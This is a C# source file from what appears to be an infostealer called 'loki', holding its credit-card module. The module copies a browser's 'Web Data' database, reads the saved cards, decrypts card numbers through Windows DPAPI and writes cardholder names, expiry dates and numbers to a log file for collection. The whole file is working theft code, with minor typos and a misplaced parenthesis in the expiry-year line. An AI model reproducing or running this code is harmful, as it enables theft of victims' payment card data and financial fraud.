using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using loki.loki.Stealer.Cookies;
using loki.sqlite;

namespace loki.loki.Stealer.Credit_Cards;

internal class Get_Credit_Cards
{
	public static List<string> CC_List = new List<string>();

	public static List<string> CC = new List<string>();

	public static int CCCouunt;

	public static void Get_CC(string profilePath, string Browser_Name, string Profile_Name)
	{
		try
		{
			string filePath = Path.Combine(profilePath, "Web Data");
			CNT cNT = new CNT(GetCookies.CreateTempCopy(filePath));
			cNT.ReadTable("credit_cards");
			for (int i = 0; i < cNT.RowLength; i++)
			{
				CCCouunt++;
				try
				{
					CC.Add("Name : " + cNT.ParseValue(i, "name_on_card").Trim() + Environment.NewLine + "Ex_Month And Year: " + Convert.ToInt32(cNT.ParseValue(i, "expiration_month").Trim()) + "/" + Convert.ToInt32(cNT.ParseValue(i, "expiration_year").Trim() + Environment.NewLine + "Card_Number" + GetCookies.DecryptBlob(cNT.ParseValue(i, "card_number_encrypted"), (DataProtectionScope)0).Trim()));
				}
				catch
				{
				}
			}
			for (int j = 0; j < CC.Count; j++)
			{
				CC_List.Add("Browser : " + Browser_Name + Environment.NewLine + "Profie : " + Profile_Name + Environment.NewLine + CC[j]);
			}
			CC.Clear();
		}
		catch
		{
		}
	}

	public static void Write_CC(string Browser_Name, string Profile_Name)
	{
		using StreamWriter streamWriter = new StreamWriter(Program.dir + "\\Browsers\\" + Profile_Name + "_" + Browser_Name + "_Credit_Cards.log");
		for (int i = 0; i < CC_List.Count; i++)
		{
			streamWriter.WriteLine(CC_List[i]);
			streamWriter.WriteLine("\n");
		}
	}
}
